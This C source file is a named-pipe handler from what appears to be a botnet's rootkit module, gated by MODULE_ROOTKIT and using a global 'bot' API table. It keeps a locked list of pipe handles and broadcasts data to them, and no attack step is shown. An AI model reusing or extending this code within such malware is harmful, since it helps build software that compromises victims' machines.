/*
	Pipe connection handler.
*/
#include "pipes.h"

#ifdef MODULE_ROOTKIT
#include "../common/string.h"
#include "../common/mem.h"

#ifdef MODULE_DEBUG
#include "debug.h"
#endif

extern bot_t bot;

static HANDLE* phPipes = NULL;
static DWORD dwPipeCount = 0;
static RTL_CRITICAL_SECTION csPipes;

void InitPipes(void)
{
#ifdef WDEBUG
	WDEBUG("Called.");
#endif
	phPipes = NULL;
	dwPipeCount = 0;
	CWA(RtlInitializeCriticalSection)(&csPipes);
#ifdef WDEBUG
	WDEBUG("Finished.");
#endif
}

void WINAPI AddPipeToList(HANDLE hPipe)
{
	HANDLE* pNewPipe = NULL;
	DWORD dwIndex = 0;
	unsigned int i;

#ifdef WDEBUG
	WDEBUG("Started.");
#endif

	CWA(RtlEnterCriticalSection)(&csPipes);

	for (i = 0; i < dwPipeCount; i++)
	{
		if (phPipes[i] == INVALID_HANDLE_VALUE)
		{
			pNewPipe = &phPipes[i];
			dwIndex = i;
			break;
		}
	}

	if (pNewPipe == NULL && memreallocEx(&phPipes, sizeof(HANDLE) * (dwPipeCount + 1)))
	{
		dwIndex = dwPipeCount++;
		pNewPipe = &phPipes[dwIndex];
	}

	if (pNewPipe != NULL)
	{
		*pNewPipe = hPipe;
	}

	CWA(RtlLeaveCriticalSection)(&csPipes);

#ifdef WDEBUG
	WDEBUG("Finished.");
#endif
}

static DWORD _FindPipe(HANDLE hPipe)
{
	unsigned int i;
	
	for (i = 0; i < dwPipeCount; i++)
	{
		if (phPipes[i] == hPipe)
			return i;
	}

	return -1;
}

void WINAPI RemovePipeFromList(HANDLE hPipe)
{
	DWORD dwIndex, dwNewCount;
	HANDLE* pPipe;

#ifdef WDEBUG
	WDEBUG("Started.");
#endif

	CWA(RtlEnterCriticalSection)(&csPipes);

	if ((dwIndex = _FindPipe(hPipe)) != -1)
	{
		pPipe = &phPipes[dwIndex];
		*pPipe = INVALID_HANDLE_VALUE;

		dwNewCount = dwPipeCount;

		while (dwNewCount > 0 && phPipes[dwNewCount - 1] == INVALID_HANDLE_VALUE) dwNewCount--;

		if (dwNewCount != dwPipeCount)
		{
			if (dwNewCount == 0)
			{
				memfree(phPipes);
				phPipes = NULL;
			}
			else memreallocEx(&phPipes, sizeof(HANDLE) * dwNewCount);
			
			dwPipeCount = dwNewCount;
		}
	}

	CWA(RtlLeaveCriticalSection)(&csPipes);

#ifdef WDEBUG
	WDEBUG("Finished.");
#endif
}

BOOL WINAPI SendDataToPipe(HANDLE hPipe, const LPSTR pszData)
{
	DWORD dwWritten;

	return bot.api.pWriteFile(hPipe, pszData, StrLengthA(pszData), &dwWritten, NULL);
}

void WINAPI SendToAllPipes(const LPSTR pszData)
{
	unsigned int i;

#ifdef WDEBUG
	WDEBUG("Started.");
#endif

	CWA(RtlEnterCriticalSection)(&csPipes);

	for (i = 0; i < dwPipeCount; i++)
	{
		if (phPipes[i] != INVALID_HANDLE_VALUE)
		{
			SendDataToPipe(phPipes[i], pszData);
		}
	}

	CWA(RtlLeaveCriticalSection)(&csPipes);

#ifdef WDEBUG
	WDEBUG("Finished.");
#endif
}
#endif